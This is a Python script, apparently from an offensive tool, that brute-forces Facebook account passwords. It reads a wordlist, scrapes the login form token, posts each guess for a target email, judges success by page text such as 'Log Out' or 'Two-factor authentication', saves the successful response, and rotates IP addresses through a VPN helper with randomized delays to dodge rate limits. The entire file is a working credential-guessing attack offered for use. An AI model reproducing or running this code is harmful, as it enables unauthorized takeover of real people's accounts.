import os
import time
import random
import requests
from bs4 import BeautifulSoup
from rich.console import Console
from utils.colors import Color
from utils.ui import display_ascii 
from utils.vpn import change_ip
from config import FACEBOOK_POST_URL, FACEBOOK_HEADERS, RANDOM_NUMBERS, WORDLIST_DIR
from asciiart import ascii_art

console = Console()

PAYLOAD = None
COOKIES = None


def create_form():
    form = dict()
    cookies = {'fr': '0ZvhC3YwYm63ZZat1..Ba0Ipu.Io.AAA.0.0.Ba0Ipu.AWUPqDLy'}
    
    data = requests.get(FACEBOOK_POST_URL, headers=FACEBOOK_HEADERS)
    
    for cookie in data.cookies:
        cookies[cookie.name] = cookie.value
    
    data = BeautifulSoup(data.text, 'html.parser').form
    
    if data.input['name'] == 'lsd':
        form['lsd'] = data.input['value']
    
    return form, cookies


def verify_password(email, index, password):
    global PAYLOAD, COOKIES
    
    if index % 10 == 0:
        PAYLOAD, COOKIES = create_form()
        PAYLOAD['email'] = email
    
    PAYLOAD['pass'] = password
    
    response = requests.post(FACEBOOK_POST_URL, data=PAYLOAD, 
                            cookies=COOKIES, headers=FACEBOOK_HEADERS)
    
    if ('Find Friends' in response.text or 'security code' in response.text or 
        'Two-factor authentication' in response.text or "Log Out" in response.text):
        open('temp', 'w').write(str(response.content))
        console.print(password, justify="center", style="#13f41e bold")
    else:
        console.print(password, justify="center", style="#ea0408 bold")
    
    if random.choice(RANDOM_NUMBERS) == 2:
        time.sleep(5)
    else:
        time.sleep(2)


def bruteforce(username, wordlist, vpn_enabled):
    try:
        wl_file = open(wordlist, 'r')
        wl_lines = wl_file.readlines()
    except FileNotFoundError:
        print(f"\n\nERROR 1x01:{Color.RED} wordlist not found, please insert your wordlist in 'wordlist' folder.\n\n{Color.END}")
        exit()
    
    for password in wl_lines:
        os.system("clear")
        display_ascii()
        verify_password(username, 10, password.strip())
        
        if vpn_enabled:
            change_ip()
